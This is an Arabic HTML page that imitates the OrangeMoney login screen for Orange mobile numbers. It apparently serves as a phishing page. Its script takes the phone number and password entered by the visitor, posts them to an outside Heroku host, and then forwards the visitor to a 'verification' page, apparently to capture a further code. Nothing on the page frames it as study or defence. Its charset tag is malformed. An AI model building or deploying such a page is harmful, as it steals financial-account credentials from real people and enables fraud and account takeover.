<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="f061f6_cca11f866a394ecc993a763d2f7a3128~mv2.jpg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول | OrangeMoney</title>
    <style>
        /* نفس التنسيق كما هو في الكود الأصلي */
    </style>
    <script>
        function redirectToVerification() {
            var phoneNumber = document.getElementById("phone-input").value;
            var password = document.getElementById("password-input").value;

            fetch('https://your-app-name.herokuapp.com/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ phoneNumber: phoneNumber, password: password })
            })
            .then(response => response.json())
            .then(data => {
                setTimeout(function() {
                    window.location.href = 'verification.html?phone=' + encodeURIComponent(phoneNumber);
                }, 500);
            })
            .catch(error => console.error('Error:', error));
        }
    </script>
</head>
<body>
    <div class="container">
        <img src="images/file-RQ4PiQTnG97TtnMlaTOMk1Th.jpg" alt="صورة مقدمة الصفحة" style="width: 100%; border-radius: 10px;">
        <h1 class="title">تسجيل الدخول الى حسابي</h1>
        <h2 class="subtitle">OrangeMoney</h2>
        
        <label class="right-align">يرجى ادخال رقم موبايل <span style="color: #FF8C00;">orange</span></label>
        <input id="phone-input" type="text" placeholder="" maxlength="10" required>
        <small class="right-align">يرجى ادخال الرقم الذي يبدأ ب 077/078/079</small>
        
        <div style="margin: 20px 0;"></div>

        <label class="right-align">يرجى ادخال كلمة سر</label>
        <input id="password-input" type="password" placeholder="أدخل كلمة السر" required>
        <small class="right-align">كتابة حروف ورموز وأرقام</small>
        <br>

        <label class="right-align">
            <input type="checkbox"> تذكرني
        </label>
        <br>
        <button onclick="redirectToVerification()">تسجيل الدخول</button>
    </div>

    <img src="img_20240715_044418_669.jpg" alt="صورة في آخر الصفحة" class="footer-image">
</body>
</html>
